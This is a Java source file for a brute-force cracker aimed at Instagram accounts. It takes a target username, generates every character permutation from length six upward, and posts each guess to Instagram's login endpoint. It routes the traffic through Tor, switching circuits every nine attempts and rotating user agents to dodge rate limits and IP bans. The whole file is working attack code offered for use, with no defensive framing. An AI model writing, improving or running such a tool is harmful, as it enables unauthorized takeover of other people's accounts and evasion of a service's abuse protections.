import okhttp3.*;
import org.paukov.combinatorics3.Generator;

import java.io.IOException;
import java.util.*;

public class Instagram {

    private static final String chars = "0219384567etaoinshrdlcumwfgypbvkjxqzETAOINSHRDLCUMWFGYPBVKJXQZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ ";

    private static final String originString = "\nOrigin: ";

    private static String userAgent;

    private static String username;

    private static OkHttpClient httpClient;

    private static Instagram instagram = new Instagram();

    private int temp = 0;

    public static void main(final String[] args) {
        System.out.print("Istagram username: ");
        username = new Scanner(System.in).next().trim();
        System.out.println("\nProcessing...");

        initHttpClient();
        newTorCircuit();

        generatePasswords();
    }

    private static void generatePasswords() {

        final List<Character> charsList = new ArrayList<>();
        for (int i = 0; i < chars.length(); i++) charsList.add(chars.charAt(i));

        for (int i = 6; true; i++) {
            Generator.permutation(charsList)
                    .withRepetitions(i)
                    .stream()
                    .forEach((p) -> {
                        try {
//                            new Thread(() -> instagram.tryPassword(makeStringPasswordWith(p))).start();
                            instagram.tryPassword(makeStringPasswordWith(p));
                            Thread.sleep(0);
                        } catch (final InterruptedException ignored) {
                        }
                    });
        }
    }

    private void tryPassword(final String password) {

        synchronized (this) {
            if (++temp == 9) {
                newTorCircuit();
                temp = 0;
            }
        }

        final Request request = initRequest(initFormBody(password));
        try (final Response response = httpClient.newCall(request).execute()) {

            final String responseBody = response.body().string();
            System.out.println(password + responseBody + response.code());
            final String substring = responseBody.substring(18, 22);
            if (substring.equals("true")) {
                System.out.println("\nPassword: " + password);
                System.exit(1);
            }
        } catch (final IOException | StringIndexOutOfBoundsException ignored) {
        }
    }

    private static void newTorCircuit() {
        try {
            final String ip = getIP();
            final TorControl torControl = new TorControl();
            torControl.authenticate();
            torControl.useProxy();
            torControl.newIdentity();
            initHttpClient();
            userAgent = RandomUserAgent.getRandomUserAgent();
            if (ip.equals(getIP())) newTorCircuit();
            else System.out.println(originString + getIP() + "; User-agent: " + userAgent + ";\n");
        } catch (final IOException ignored) {
        }
    }

    private static void initHttpClient() {
        httpClient = new OkHttpClient.Builder().build();
    }

    private static String getIP() throws IOException {
        final Request request = new Request.Builder()
                .url("https://ifconfig.me/ip")
                .build();
        final Response response = httpClient.newCall(request).execute();
        return response.body().string();
    }

    private Request initRequest(final FormBody formBody) {
        return new Request.Builder()
                .url("https://www.instagram.com/accounts/login/ajax/")
                .addHeader("user-agent", userAgent)
                .addHeader("x-csrftoken", "s3Z2q17uZlpkxXm9PluRf1M3vmlZV9El")
                .post(formBody)
                .build();
    }

    private FormBody initFormBody(final String password) {
        return new FormBody.Builder()
                .add("username", username)
                .add("enc_password", password)
                .add("queryParams", "{}")
                .add("optIntoOneTap", "false")
                .build();
    }

    private static String makeStringPasswordWith(final List<Character> list) {
        String password = "";
        for (final Character character : list) password = password.concat(String.valueOf(character));
        return password;
    }

}
